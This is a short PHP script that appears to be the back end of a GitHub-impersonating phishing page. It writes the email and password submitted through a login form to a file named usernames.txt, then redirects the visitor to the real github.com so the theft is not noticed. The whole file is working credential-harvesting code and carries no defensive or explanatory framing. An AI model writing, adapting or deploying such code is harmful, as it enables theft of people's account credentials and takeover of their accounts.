<?php 
file_put_contents("usernames.txt", "Github Username: " . $_POST['email'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.github.com');
exit();
?>
